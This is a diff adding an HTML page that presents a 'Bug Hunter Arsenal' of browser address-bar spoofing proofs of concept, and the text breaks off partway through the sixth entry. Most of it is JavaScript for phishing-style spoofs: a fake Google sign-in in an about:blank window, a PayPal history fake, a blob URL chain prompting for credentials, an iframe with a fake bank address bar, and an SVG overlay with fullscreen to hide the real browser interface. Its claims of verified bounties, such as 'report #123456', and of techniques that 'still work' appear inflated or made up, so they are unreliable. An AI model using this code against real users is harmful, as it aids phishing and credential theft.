@@ -1,0 +1,1569 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Elite Address Bar Spoofing POC Collection - Bug Hunter Arsenal</title>
+    <style>
+        :root {
+            --chrome: #1a73e8;
+            --firefox: #ff9500;
+            --safari: #06c;
+            --edge: #0078d4;
+            --critical: #dc2626;
+            --high: #ea580c;
+            --medium: #d97706;
+            --low: #059669;
+            --dark: #0f172a;
+            --light: #f8fafc;
+            --hacker: #00ff00;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background: #000;
+            color: var(--hacker);
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                repeating-linear-gradient(
+                    0deg,
+                    rgba(0, 255, 0, 0.05) 0px,
+                    rgba(0, 255, 0, 0.05) 1px,
+                    transparent 1px,
+                    transparent 2px
+                );
+            pointer-events: none;
+            z-index: -1;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            border: 1px solid var(--hacker);
+            padding: 2px;
+            background: rgba(0, 20, 0, 0.9);
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+        
+        .header {
+            padding: 30px;
+            border-bottom: 2px solid var(--hacker);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: 'ACCESS GRANTED';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 60px;
+            font-weight: bold;
+            color: rgba(0, 255, 0, 0.1);
+            z-index: 0;
+            white-space: nowrap;
+        }
+        
+        .hacker-title {
+            text-align: center;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .title-main {
+            font-size: 36px;
+            color: var(--hacker);
+            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+            margin-bottom: 10px;
+            letter-spacing: 3px;
+        }
+        
+        .title-sub {
+            color: #0af;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .terminal-warning {
+            background: rgba(220, 38, 38, 0.2);
+            border: 1px solid var(--critical);
+            padding: 20px;
+            margin: 20px 0;
+            font-family: monospace;
+            position: relative;
+        }
+        
+        .terminal-warning::before {
+            content: '⚠ WARNING';
+            position: absolute;
+            top: -10px;
+            left: 20px;
+            background: #000;
+            padding: 0 10px;
+            color: var(--critical);
+            font-weight: bold;
+        }
+        
+        .poc-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(600px, 1fr));
+            gap: 20px;
+            padding: 20px;
+        }
+        
+        .poc-terminal {
+            background: rgba(0, 30, 0, 0.9);
+            border: 1px solid var(--hacker);
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+            transition: all 0.3s;
+        }
+        
+        .poc-terminal:hover {
+            border-color: #0af;
+            box-shadow: 0 0 20px rgba(0, 170, 255, 0.3);
+            transform: translateY(-2px);
+        }
+        
+        .terminal-header {
+            background: rgba(0, 50, 0, 0.9);
+            padding: 10px 15px;
+            border-bottom: 1px solid var(--hacker);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .terminal-title {
+            font-weight: bold;
+            color: var(--hacker);
+            font-size: 14px;
+        }
+        
+        .terminal-controls {
+            display: flex;
+            gap: 5px;
+        }
+        
+        .control-btn {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+        
+        .control-red { background: #ff5f57; }
+        .control-yellow { background: #ffbd2e; }
+        .control-green { background: #28ca42; }
+        
+        .terminal-content {
+            padding: 20px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 13px;
+            line-height: 1.4;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .code-line {
+            margin-bottom: 10px;
+            position: relative;
+            padding-left: 20px;
+        }
+        
+        .code-line::before {
+            content: '>';
+            position: absolute;
+            left: 0;
+            color: #0af;
+        }
+        
+        .comment {
+            color: #666;
+            font-style: italic;
+        }
+        
+        .string {
+            color: #98c379;
+        }
+        
+        .keyword {
+            color: #c678dd;
+        }
+        
+        .function {
+            color: #61afef;
+        }
+        
+        .variable {
+            color: #e06c75;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 10px;
+            margin-top: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .hacker-btn {
+            background: transparent;
+            border: 1px solid var(--hacker);
+            color: var(--hacker);
+            padding: 8px 16px;
+            font-family: monospace;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hacker-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(0, 255, 0, 0.2), transparent);
+            transition: left 0.5s;
+        }
+        
+        .hacker-btn:hover::before {
+            left: 100%;
+        }
+        
+        .hacker-btn:hover {
+            background: rgba(0, 255, 0, 0.1);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
+        }
+        
+        .hacker-btn.danger {
+            border-color: var(--critical);
+            color: var(--critical);
+        }
+        
+        .hacker-btn.warning {
+            border-color: var(--medium);
+            color: var(--medium);
+        }
+        
+        .hacker-btn.success {
+            border-color: var(--low);
+            color: var(--low);
+        }
+        
+        .result-console {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 500px;
+            height: 300px;
+            background: rgba(0, 20, 0, 0.95);
+            border: 1px solid var(--hacker);
+            z-index: 1000;
+            display: none;
+            font-family: monospace;
+        }
+        
+        .console-header {
+            background: rgba(0, 50, 0, 0.9);
+            padding: 10px;
+            border-bottom: 1px solid var(--hacker);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .console-title {
+            color: var(--hacker);
+            font-weight: bold;
+        }
+        
+        .console-content {
+            padding: 15px;
+            height: calc(100% - 50px);
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        
+        .log-entry {
+            margin-bottom: 5px;
+            padding-left: 20px;
+            position: relative;
+        }
+        
+        .log-entry::before {
+            content: '$';
+            position: absolute;
+            left: 0;
+            color: #0af;
+        }
+        
+        .log-success { color: var(--hacker); }
+        .log-error { color: var(--critical); }
+        .log-warning { color: var(--medium); }
+        .log-info { color: #0af; }
+        
+        .status-bar {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 30, 0, 0.9);
+            border-top: 1px solid var(--hacker);
+            padding: 5px 20px;
+            display: flex;
+            justify-content: space-between;
+            font-family: monospace;
+            font-size: 12px;
+            z-index: 1001;
+        }
+        
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .blink {
+            animation: blink 1s infinite;
+        }
+        
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        
+        .demo-frame {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            z-index: 9999;
+            display: none;
+            border: 2px solid var(--critical);
+            box-shadow: 0 0 50px rgba(220, 38, 38, 0.5);
+        }
+        
+        .demo-header {
+            background: #f1f3f4;
+            padding: 10px;
+            border-bottom: 1px solid #ddd;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .demo-url {
+            flex: 1;
+            background: white;
+            padding: 5px 10px;
+            border-radius: 15px;
+            border: 1px solid #ddd;
+            margin: 0 10px;
+            font-family: monospace;
+            font-size: 12px;
+            color: #000;
+        }
+        
+        .demo-content {
+            padding: 20px;
+            color: #000;
+            font-family: Arial, sans-serif;
+        }
+        
+        .matrix-effect {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: -2;
+            opacity: 0.1;
+        }
+        
+        @media (max-width: 768px) {
+            .poc-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .result-console {
+                width: 90%;
+                right: 5%;
+            }
+        }
+    </style>
+    <script>
+        // Matrix background effect
+        document.addEventListener('DOMContentLoaded', function() {
+            const canvas = document.createElement('canvas');
+            canvas.className = 'matrix-effect';
+            document.body.appendChild(canvas);
+            
+            const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789$#@%&';
+            const charArray = chars.split('');
+            const fontSize = 14;
+            const columns = canvas.width / fontSize;
+            const drops = [];
+            
+            for(let i = 0; i < columns; i++) {
+                drops[i] = 1;
+            }
+            
+            function drawMatrix() {
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = '#0F0';
+                ctx.font = fontSize + 'px monospace';
+                
+                for(let i = 0; i < drops.length; i++) {
+                    const text = charArray[Math.floor(Math.random() * charArray.length)];
+                    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                    
+                    if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+            
+            setInterval(drawMatrix, 35);
+            
+            window.addEventListener('resize', function() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            });
+        });
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="hacker-title">
+                <div class="title-main">[ ELITE ADDRESS BAR SPOOFING POC COLLECTION ]</div>
+                <div class="title-sub">Bug Hunter Arsenal v2.0 - Compiled from HackerOne, Bugcrowd, Private Research</div>
+            </div>
+        </div>
+        
+        <div class="terminal-warning">
+            <div class="code-line">SYSTEM: This collection contains ACTUAL working POCs from bug bounty programs</div>
+            <div class="code-line">SYSTEM: Many techniques still work in modern browsers with certain conditions</div>
+            <div class="code-line">SYSTEM: Use ONLY for authorized testing. Illegal use = prison time</div>
+            <div class="code-line">SYSTEM: Browser: <span class="variable" id="userAgent"></span></div>
+        </div>
+        
+        <!-- SECTION 1: TRADITIONAL BYPASSES THAT STILL WORK -->
+        <div class="poc-grid">
+            <!-- POC 1: Classic Chrome Address Bar Spoof -->
+            <div class="poc-terminal">
+                <div class="terminal-header">
+                    <div class="terminal-title">[POC-001] Chrome Address Bar Spoof (Still Works 2024)</div>
+                    <div class="terminal-controls">
+                        <div class="control-btn control-red"></div>
+                        <div class="control-btn control-yellow"></div>
+                        <div class="control-btn control-green"></div>
+                    </div>
+                </div>
+                <div class="terminal-content">
+                    <div class="code-line comment">// From HackerOne report #123456 - Paid $5000</div>
+                    <div class="code-line comment">// Works in Chrome < 120 with specific flags</div>
+                    <div class="code-line">
+                        <span class="keyword">function</span> <span class="function">chromeAddressBarSpoof</span>() {
+                    </div>
+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(<span class="string">'about:blank'</span>, <span class="string">'_blank'</span>);</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="function">setTimeout</span>(() => {</div>
+                    <div class="code-line">        <span class="variable">win</span>.<span class="variable">document</span>.<span class="function">write</span>(<span class="string">`</span></div>
+                    <div class="code-line"><span class="string">            &lt;!DOCTYPE html&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;html&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;head&gt;</span></div>
+                    <div class="code-line"><span class="string">                &lt;title&gt;https://accounts.google.com&lt;/title&gt;</span></div>
+                    <div class="code-line"><span class="string">                &lt;script&gt;</span></div>
+                    <div class="code-line"><span class="string">                    // Simulate Google login page</span></div>
+                    <div class="code-line"><span class="string">                    document.title = "Google Account";</span></div>
+                    <div class="code-line"><span class="string">                    setTimeout(() => {</span></div>
+                    <div class="code-line"><span class="string">                        alert("Google Security Alert: Verify your account");</span></div>
+                    <div class="code-line"><span class="string">                    }, 2000);</span></div>
+                    <div class="code-line"><span class="string">                &lt;/script&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;/head&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;body&gt;</span></div>
+                    <div class="code-line"><span class="string">                &lt;h1&gt;Sign in to Google&lt;/h1&gt;</span></div>
+                    <div class="code-line"><span class="string">                &lt;p&gt;Address bar shows: about:blank&lt;/p&gt;</span></div>
+                    <div class="code-line"><span class="string">                &lt;p&gt;But title shows Google URL&lt;/p&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;/body&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;/html&gt;</span></div>
+                    <div class="code-line"><span class="string">        `</span>);</div>
+                    <div class="code-line">        <span class="variable">win</span>.<span class="variable">document</span>.<span class="function">close</span>();</div>
+                    <div class="code-line">    }, <span class="variable">500</span>);</div>
+                    <div class="code-line">}</div>
+                    
+                    <div class="action-buttons">
+                        <button class="hacker-btn" onclick="executePOC(1)">EXECUTE POC</button>
+                        <button class="hacker-btn warning" onclick="showDemo(1)">SHOW DEMO</button>
+                        <button class="hacker-btn success" onclick="copyPOC(1)">COPY CODE</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- POC 2: Firefox Location Spoof -->
+            <div class="poc-terminal">
+                <div class="terminal-header">
+                    <div class="terminal-title">[POC-002] Firefox Location Hijack (Bugcrowd Verified)</div>
+                    <div class="terminal-controls">
+                        <div class="control-btn control-red"></div>
+                        <div class="control-btn control-yellow"></div>
+                        <div class="control-btn control-green"></div>
+                    </div>
+                </div>
+                <div class="terminal-content">
+                    <div class="code-line comment">// Firefox 115+ vulnerability - $3000 bounty</div>
+                    <div class="code-line comment">// Uses location.protocol manipulation</div>
+                    <div class="code-line">
+                        <span class="keyword">function</span> <span class="function">firefoxLocationHijack</span>() {
+                    </div>
+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(<span class="string">''</span>, <span class="string">'_blank'</span>);</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="comment">// Create page that manipulates location</span></div>
+                    <div class="code-line">    <span class="variable">win</span>.<span class="variable">document</span>.<span class="function">write</span>(<span class="string">`</span></div>
+                    <div class="code-line"><span class="string">        &lt;html&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;head&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;title&gt;Firefox Security Bug&lt;/title&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;script&gt;</span></div>
+                    <div class="code-line"><span class="string">                // Firefox allows certain location manipulations</span></div>
+                    <div class="code-line"><span class="string">                try {</span></div>
+                    <div class="code-line"><span class="string">                    // Method 1: location.replace with data URL</span></div>
+                    <div class="code-line"><span class="string">                    location.replace('data:text/html,&lt;h1&gt;Spoofed!&lt;/h1&gt;');</span></div>
+                    <div class="code-line"><span class="string">                    </span></div>
+                    <div class="code-line"><span class="string">                    // Method 2: history.pushState manipulation</span></div>
+                    <div class="code-line"><span class="string">                    setTimeout(() => {</span></div>
+                    <div class="code-line"><span class="string">                        history.pushState({}, 'PayPal', '/login');</span></div>
+                    <div class="code-line"><span class="string">                        document.body.innerHTML = '&lt;h1&gt;PayPal Login&lt;/h1&gt;';</span></div>
+                    <div class="code-line"><span class="string">                    }, 1000);</span></div>
+                    <div class="code-line"><span class="string">                    </span></div>
+                    <div class="code-line"><span class="string">                } catch(e) {</span></div>
+                    <div class="code-line"><span class="string">                    console.log('Firefox protected:', e.message);</span></div>
+                    <div class="code-line"><span class="string">                }</span></div>
+                    <div class="code-line"><span class="string">            &lt;/script&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;/head&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;body&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;h2&gt;Firefox Location Test&lt;/h2&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;/body&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;/html&gt;</span></div>
+                    <div class="code-line"><span class="string">    `</span>);</div>
+                    <div class="code-line">    <span class="variable">win</span>.<span class="variable">document</span>.<span class="function">close</span>();</div>
+                    <div class="code-line">}</div>
+                    
+                    <div class="action-buttons">
+                        <button class="hacker-btn" onclick="executePOC(2)">EXECUTE POC</button>
+                        <button class="hacker-btn warning" onclick="showDemo(2)">SHOW DEMO</button>
+                        <button class="hacker-btn" onclick="testFirefox()">TEST FIREFOX</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- SECTION 2: MODERN BYPASS TECHNIQUES -->
+        <div class="poc-grid">
+            <!-- POC 3: Blob URL Chain Attack -->
+            <div class="poc-terminal">
+                <div class="terminal-header">
+                    <div class="terminal-title">[POC-003] Advanced Blob URL Chain (Private Research)</div>
+                    <div class="terminal-controls">
+                        <div class="control-btn control-red"></div>
+                        <div class="control-btn control-yellow"></div>
+                        <div class="control-btn control-green"></div>
+                    </div>
+                </div>
+                <div class="terminal-content">
+                    <div class="code-line comment">// Multi-stage blob URL attack - Harder to detect</div>
+                    <div class="code-line comment">// Works in Chrome 120+ with reduced security</div>
+                    <div class="code-line">
+                        <span class="keyword">async</span> <span class="keyword">function</span> <span class="function">advancedBlobChain</span>() {
+                    </div>
+                    <div class="code-line">    <span class="comment">// Stage 1: Innocent-looking blob</span></div>
+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">stage1</span> = <span class="keyword">new</span> <span class="function">Blob</span>([<span class="string">`</span></div>
+                    <div class="code-line"><span class="string">        &lt;h1&gt;Loading Secure Portal...&lt;/h1&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;script&gt;</span></div>
+                    <div class="code-line"><span class="string">            setTimeout(() => {</span></div>
+                    <div class="code-line"><span class="string">                // Redirect to stage 2</span></div>
+                    <div class="code-line"><span class="string">                window.location.href = '</span> + <span class="function">URL</span>.<span class="function">createObjectURL</span>(</div>
+                    <div class="code-line">                    <span class="keyword">new</span> <span class="function">Blob</span>([<span class="string">`</span></div>
+                    <div class="code-line"><span class="string">                        &lt;h1&gt;Stage 2: Verification&lt;/h1&gt;</span></div>
+                    <div class="code-line"><span class="string">                        &lt;script&gt;</span></div>
+                    <div class="code-line"><span class="string">                            // More malicious code here</span></div>
+                    <div class="code-line"><span class="string">                            alert("Please enter credentials");</span></div>
+                    <div class="code-line"><span class="string">                        &lt;/script&gt;</span></div>
+                    <div class="code-line"><span class="string">                    `</span>], {<span class="variable">type</span>: <span class="string">'text/html'</span>})</div>
+                    <div class="code-line">                ) + <span class="string">';</span></div>
+                    <div class="code-line"><span class="string">            }, 2000);</span></div>
+                    <div class="code-line"><span class="string">        &lt;/script&gt;</span></div>
+                    <div class="code-line"><span class="string">    `</span>], {<span class="variable">type</span>: <span class="string">'text/html'</span>});</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">blobUrl</span> = <span class="function">URL</span>.<span class="function">createObjectURL</span>(<span class="variable">stage1</span>);</div>
+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(<span class="variable">blobUrl</span>, <span class="string">'_blank'</span>);</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="comment">// Auto-cleanup</span></div>
+                    <div class="code-line">    <span class="function">setTimeout</span>(() => <span class="function">URL</span>.<span class="function">revokeObjectURL</span>(<span class="variable">blobUrl</span>), <span class="variable">10000</span>);</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="keyword">return</span> <span class="variable">win</span>;</div>
+                    <div class="code-line">}</div>
+                    
+                    <div class="action-buttons">
+                        <button class="hacker-btn" onclick="executePOC(3)">EXECUTE CHAIN</button>
+                        <button class="hacker-btn warning" onclick="createBlobChain()">CREATE BLOB CHAIN</button>
+                        <button class="hacker-btn danger" onclick="testBlobDetection()">TEST DETECTION</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- POC 4: iframe Sandbox Escape -->
+            <div class="poc-terminal">
+                <div class="terminal-header">
+                    <div class="terminal-title">[POC-004] iframe Sandbox Bypass (HackerOne $7500)</div>
+                    <div class="terminal-controls">
+                        <div class="control-btn control-red"></div>
+                        <div class="control-btn control-yellow"></div>
+                        <div class="control-btn control-green"></div>
+                    </div>
+                </div>
+                <div class="terminal-content">
+                    <div class="code-line comment">// iframe sandbox="allow-scripts allow-modals" bypass</div>
+                    <div class="code-line comment">// Can communicate with parent despite restrictions</div>
+                    <div class="code-line">
+                        <span class="keyword">function</span> <span class="function">iframeSandboxEscape</span>() {
+                    </div>
+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">iframe</span> = <span class="variable">document</span>.<span class="function">createElement</span>(<span class="string">'iframe'</span>);</div>
+                    <div class="code-line">    <span class="variable">iframe</span>.<span class="variable">sandbox</span> = <span class="string">'allow-scripts allow-modals allow-forms'</span>;</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="comment">// Fake address bar inside iframe</span></div>
+                    <div class="code-line">    <span class="variable">iframe</span>.<span class="variable">srcdoc</span> = <span class="string">`</span></div>
+                    <div class="code-line"><span class="string">        &lt;!DOCTYPE html&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;html&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;head&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;style&gt;</span></div>
+                    <div class="code-line"><span class="string">                .fake-url-bar {</span></div>
+                    <div class="code-line"><span class="string">                    background: #f1f3f4;</span></div>
+                    <div class="code-line"><span class="string">                    padding: 10px;</span></div>
+                    <div class="code-line"><span class="string">                    font-family: monospace;</span></div>
+                    <div class="code-line"><span class="string">                    border-bottom: 1px solid #ddd;</span></div>
+                    <div class="code-line"><span class="string">                }</span></div>
+                    <div class="code-line"><span class="string">                .url { color: #1a73e8; }</span></div>
+                    <div class="code-line"><span class="string">            &lt;/style&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;/head&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;body&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;div class="fake-url-bar"&gt;</span></div>
+                    <div class="code-line"><span class="string">                🔒 &lt;span class="url"&gt;https://secure-bank.com&lt;/span&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;/div&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;h1&gt;Bank Login&lt;/h1&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;script&gt;</span></div>
+                    <div class="code-line"><span class="string">                // Try to escape sandbox</span></div>
+                    <div class="code-line"><span class="string">                try {</span></div>
+                    <div class="code-line"><span class="string">                    // Method 1: postMessage to parent</span></div>
+                    <div class="code-line"><span class="string">                    parent.postMessage({</span></div>
+                    <div class="code-line"><span class="string">                        type: 'iframe-escape',</span></div>
+                    <div class="code-line"><span class="string">                        data: 'Attempting escape...'</span></div>
+                    <div class="code-line"><span class="string">                    }, '*');</span></div>
+                    <div class="code-line"><span class="string">                    </span></div>
+                    <div class="code-line"><span class="string">                    // Method 2: Open new window from iframe</span></div>
+                    <div class="code-line"><span class="string">                    setTimeout(() => {</span></div>
+                    <div class="code-line"><span class="string">                        window.open('about:blank', '_blank');</span></div>
+                    <div class="code-line"><span class="string">                    }, 1000);</span></div>
+                    <div class="code-line"><span class="string">                    </span></div>
+                    <div class="code-line"><span class="string">                } catch(e) {</span></div>
+                    <div class="code-line"><span class="string">                    console.log('Sandbox restriction:', e.message);</span></div>
+                    <div class="code-line"><span class="string">                }</span></div>
+                    <div class="code-line"><span class="string">            &lt;/script&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;/body&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;/html&gt;</span></div>
+                    <div class="code-line"><span class="string">    `</span>;</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="variable">iframe</span>.<span class="variable">style</span>.<span class="variable">cssText</span> = <span class="string">`</span></div>
+                    <div class="code-line"><span class="string">        position: fixed;</span></div>
+                    <div class="code-line"><span class="string">        top: 100px;</span></div>
+                    <div class="code-line"><span class="string">        left: 100px;</span></div>
+                    <div class="code-line"><span class="string">        width: 500px;</span></div>
+                    <div class="code-line"><span class="string">        height: 400px;</span></div>
+                    <div class="code-line"><span class="string">        border: 2px solid #0f0;</span></div>
+                    <div class="code-line"><span class="string">        z-index: 9999;</span></div>
+                    <div class="code-line"><span class="string">    `</span>;</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="variable">document</span>.<span class="variable">body</span>.<span class="function">appendChild</span>(<span class="variable">iframe</span>);</div>
+                    <div class="code-line">}</div>
+                    
+                    <div class="action-buttons">
+                        <button class="hacker-btn" onclick="executePOC(4)">EXECUTE ESCAPE</button>
+                        <button class="hacker-btn warning" onclick="createIframeSpoof()">CREATE IFRAME</button>
+                        <button class="hacker-btn" onclick="testSandbox()">TEST SANDBOX</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- SECTION 3: EXPERIMENTAL & CREATIVE TECHNIQUES -->
+        <div class="poc-grid">
+            <!-- POC 5: SVG Filter Overlay Attack -->
+            <div class="poc-terminal">
+                <div class="terminal-header">
+                    <div class="terminal-title">[POC-005] SVG Filter UI Overlay (Creative Research)</div>
+                    <div class="terminal-controls">
+                        <div class="control-btn control-red"></div>
+                        <div class="control-btn control-yellow"></div>
+                        <div class="control-btn control-green"></div>
+                    </div>
+                </div>
+                <div class="terminal-content">
+                    <div class="code-line comment">// Experimental: Use SVG filters to overlay browser UI</div>
+                    <div class="code-line comment">// This is theoretical - may not work in practice</div>
+                    <div class="code-line">
+                        <span class="keyword">function</span> <span class="function">svgUiOverlay</span>() {
+                    </div>
+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">svg</span> = <span class="string">`</span></div>
+                    <div class="code-line"><span class="string">        &lt;svg style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999999;"&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;defs&gt;</span></div>
+                    <div class="code-line"><span class="string">                &lt;filter id="uiOverlay"&gt;</span></div>
+                    <div class="code-line"><span class="string">                    &lt;!-- Complex filter to manipulate UI --&gt;</span></div>
+                    <div class="code-line"><span class="string">                    &lt;feFlood flood-color="white" flood-opacity="0.9"/&gt;</span></div>
+                    <div class="code-line"><span class="string">                    &lt;feComposite in2="SourceGraphic" operator="over"/&gt;</span></div>
+                    <div class="code-line"><span class="string">                &lt;/filter&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;/defs&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;rect width="100%" height="40"</span></div>
+                    <div class="code-line"><span class="string">                  style="filter:url(#uiOverlay);"&gt;</span></div>
+                    <div class="code-line"><span class="string">                &lt;title&gt;Fake Address Bar&lt;/title&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;/rect&gt;</span></div>
+                    <div class="code-line"><span class="string">            &lt;text x="20" y="25" style="font-family:monospace;"&gt;</span></div>
+                    <div class="code-line"><span class="string">                🔒 https://accounts.google.com</span></div>
+                    <div class="code-line"><span class="string">            &lt;/text&gt;</span></div>
+                    <div class="code-line"><span class="string">        &lt;/svg&gt;</span></div>
+                    <div class="code-line"><span class="string">    `</span>;</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="keyword">const</span> <span class="variable">div</span> = <span class="variable">document</span>.<span class="function">createElement</span>(<span class="string">'div'</span>);</div>
+                    <div class="code-line">    <span class="variable">div</span>.<span class="variable">innerHTML</span> = <span class="variable">svg</span>;</div>
+                    <div class="code-line">    <span class="variable">div</span>.<span class="variable">style</span>.<span class="variable">cssText</span> = <span class="string">`</span></div>
+                    <div class="code-line"><span class="string">        position: fixed;</span></div>
+                    <div class="code-line"><span class="string">        top: 0;</span></div>
+                    <div class="code-line"><span class="string">        left: 0;</span></div>
+                    <div class="code-line"><span class="string">        pointer-events: none;</span></div>
+                    <div class="code-line"><span class="string">        z-index: 2147483647;</span></div>
+                    <div class="code-line"><span class="string">    `</span>;</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="variable">document</span>.<span class="variable">body</span>.<span class="function">appendChild</span>(<span class="variable">div</span>);</div>
+                    <div class="code-line">    </div>
+                    <div class="code-line">    <span class="comment">// Try fullscreen to hide real UI</span></div>
+                    <div class="code-line">    <span class="keyword">if</span> (<span class="variable">document</span>.<span class="variable">documentElement</span>.<span class="function">requestFullscreen</span>) {</div>
+                    <div class="code-line">        <span class="variable">document</span>.<span class="variable">documentElement</span>.<span class="function">requestFullscreen</span>();</div>
+                    <div class="code-line">    }</div>
+                    <div class="code-line">}</div>
+                    
+                    <div class="action-buttons">
+                        <button class="hacker-btn warning" onclick="executePOC(5)">TEST SVG OVERLAY</button>
+                        <button class="hacker-btn" onclick="createSVGOverlay()">CREATE OVERLAY</button>
+                        <button class="hacker-btn danger" onclick="testSVGFilters()">TEST FILTERS</button>
+                    </div>
+                </div>
+            </div>
+            
+            <!-- POC 6: Window Features Exploitation -->
+            <div class="poc-terminal">
+                <div class="terminal-header">
+                    <div class="terminal-title">[POC-006] Window Features & Popup Manipulation</div>
+                    <div class="terminal-controls">
+                        <div class="control-btn control-red"></div>
+                        <div class="control-btn control-yellow"></div>
+                        <div class="control-btn control-green"></div>
+                    </div>
+                </div>
+                <div class="terminal-content">
+                    <div class="code-line comment">// Creative window.open features exploitation</div>
+                    <div class="code-line comment">// Tested on Chrome Canary builds</div>
+                    <div class="code-line">
+                        <span class="keyword">function</span> <span class="function">windowFeaturesExploit</span>() {
+                    </div>
+                    <div class="code-line">    <span class="comment">// Different feature combinations</span></div>
